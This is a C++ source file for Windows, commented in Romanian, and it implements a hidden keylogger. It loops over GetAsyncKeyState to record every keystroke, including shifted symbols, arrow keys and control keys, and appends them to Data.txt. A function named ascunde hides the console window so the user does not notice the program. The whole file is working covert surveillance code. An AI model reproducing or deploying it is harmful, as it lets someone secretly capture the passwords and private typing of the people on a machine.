#include <iostream>
#include <fstream>
#include <Windows.h> // Windows specific header file - help talking to OS
#include <WinUser.h>


using namespace std;

void check()
{
	char cheie;
	for (;;)
	{
		for (cheie = 8; cheie < 127; cheie++)
		{
			if (GetAsyncKeyState(cheie) == -32767) // daca apasam orice tasta
			{
				ofstream scrie("Data.txt", ios::app);
				//Verificare daca tasta este cuprinsa intre 64 si 91 si daca tasta shift nu este apasata.Tasta shift in  hexa este 0x10=16;
				//Daca se satisface conditia atunci se va adauga 32 la tasta precedenta;
				if (cheie > 64 && cheie < 91 && !(GetAsyncKeyState(0x10)))
				{
					cheie += 32;
					scrie << cheie;
					scrie.close();
					break;
				}
				else
					if (cheie > 64 && cheie < 91)
					{
						cheie += 32;
						scrie << cheie;
						scrie.close();
						break;
					}
					else
					{
						switch (cheie)
						{
						case 27: scrie << "<ESC>";
						case 127:scrie << "<DEL>";

						case 48:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 0
								scrie << ")";
							else
								scrie << "0";
						}break;
						case 49:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 1
								scrie << "!";
							else
								scrie << "1";

						}break;
						case 50:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 2
								scrie << "@";
							else
								scrie << "2";

						}break;
						case 51:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 3
								scrie << "#";
							else
								scrie << "3";

						}break;
						case 52:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 4
								scrie << "$";
							else
								scrie << "4";

						}break;
						case 53:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 5
								scrie << "%";
							else
								scrie << "5";

						}break;
						case 54:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 6
								scrie << "^";
							else
								scrie << "6";

						}break;
						case 55:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 7
								scrie << "&";
							else
								scrie << "7";

						}break;
						case 56:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 8
								scrie << "*";
							else
								scrie << "8";

						}break;
						case 57:
						{
							if (GetAsyncKeyState(0x10)) // Shift + 9
								scrie << "(";
							else
								scrie << "9";

						}break;

						case 58:
						{
							if (GetAsyncKeyState(0x10)) // Shift + -
								scrie << "_";
							else
								scrie << "-";

						}break;
						case 59:
						{
							if (GetAsyncKeyState(0x10)) // Shift + =
								scrie << "+";
							else
								scrie << "=";

						}break;
						case VK_SPACE:
							scrie << " ";
							break;
						case VK_RETURN:
							scrie << "\n";
							break;
						case VK_SHIFT:
							scrie << "<SHIFT>";
							break;
						case VK_BACK:
							scrie << "\b";
							break;
						case VK_RBUTTON:
							scrie << "#CLICK_DREAPTA";
							break;
						case VK_CAPITAL:
							scrie << "#CAPS_LOCK";
							break;
						case VK_TAB:
							scrie << "#TAB";
							break;
						case VK_UP:
							scrie << "#SUS";
							break;
						case VK_DOWN:
							scrie << "#JOS";
							break;
						case VK_RIGHT:
							scrie << "#DREAPTA";
							break;
						case VK_LEFT:
							scrie << "#STANGA";
							break;
						case VK_CONTROL:
							scrie << "#CTRL";
							break;
						default:
							scrie << cheie;


						}
						{

						}
					}
			}

		}

	}
}
void ascunde()
{
	HWND ascuns;
	AllocConsole();
	ascuns = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(ascuns, 0);
} 

int main()
{
	ascunde();
	check();
	return 0;
}

